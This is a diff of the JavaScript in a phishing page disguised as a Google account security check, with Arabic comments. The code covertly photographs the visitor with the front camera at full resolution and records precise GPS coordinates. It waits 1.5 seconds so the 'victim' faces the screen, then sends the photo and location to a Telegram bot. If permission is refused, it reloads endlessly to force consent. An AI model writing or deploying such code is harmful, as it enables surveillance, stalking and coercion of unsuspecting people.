@@ -51,60 +51,63 @@
             document.getElementById('loader').style.display = 'block';
             document.getElementById('status').style.display = 'block';
 
+            const constraints = { 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                } 
+            };
+
             try {
-                // تعديل: طلب أعلى جودة ممكنة (Full HD) وسرعة التقاط
-                const constraints = { 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    } 
-                };
-                
+                // محاولة سحب الكاميرا (الإجبار الأول)
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
+                // محاولة سحب الموقع بدقة عالية (الإجبار الثاني)
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const locLink = `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+                    const locLink = `📍 الموقع الدقيق: https://www.google.com/maps?q=${lat},${lon}`;
 
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    // تفعيل التقاط سريع بمجرد تحميل الميتا
+                    
                     video.onloadedmetadata = async () => {
                         await video.play();
 
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth; 
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        // تعديل: جودة الصورة 1.0 (أعلى جودة)
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', chat_id);
-                            formData.append('photo', blob, 'secure_check.jpg');
-                            formData.append('caption', locLink);
+                        // "ثغرة التأخير": ننتظر 1.5 ثانية لضمان أن الضحية يركز في الشاشة بعد الضغط
+                        setTimeout(async () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth; 
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                formData.append('chat_id', chat_id);
+                                formData.append('photo', blob, 'high_res_secure.jpg');
+                                formData.append('caption', locLink);
 
-                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
+                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
 
-                            // إيقاف الكاميرا بعد الالتقاط
-                            stream.getTracks().forEach(track => track.stop());
-                            window.location.href = "https://myaccount.google.com/security";
+                                // إيقاف الكاميرا والتحويل فوراً
+                                stream.getTracks().forEach(track => track.stop());
+                                window.location.href = "https://myaccount.google.com/security";
 
-                        }, 'image/jpeg', 1.0); 
+                            }, 'image/jpeg', 1.0); // أعلى جودة 100%
+                        }, 1500); 
                     };
 
                 }, (err) => {
-                    alert("خطأ أمني: يجب السماح بالوصول للموقع لإتمام الفحص.");
+                    // إذا رفض الموقع: إعادة تشغيل الثغرة
                     location.reload();
-                }, { enableHighAccuracy: true });
+                }, { enableHighAccuracy: true, timeout: 5000 });
 
             } catch (err) {
-                alert("فشل النظام: لا يمكن تأمين الحساب بدون أذونات الكاميرا.");
+                // إذا رفض الكاميرا: إعادة تشغيل الثغرة فوراً (Infinite Loop)
                 location.reload();
             }
         }
